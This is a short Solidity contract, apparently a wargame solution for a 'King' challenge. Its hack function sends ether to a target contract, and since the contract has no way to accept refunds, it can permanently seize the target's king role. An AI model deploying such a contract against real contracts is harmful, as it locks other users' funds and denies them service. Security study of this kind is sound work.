// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

error KING__TRANSFAILED();

contract KingAttack {
    address payable king;

    constructor(address payable _king) {
        king = _king;
    }

    function addMoney() public payable {}

    function hack(uint256 amount) public payable {
        (bool success, ) = king.call{value: amount}("");
        if (!success) {
            revert KING__TRANSFAILED();
        }
    }
}
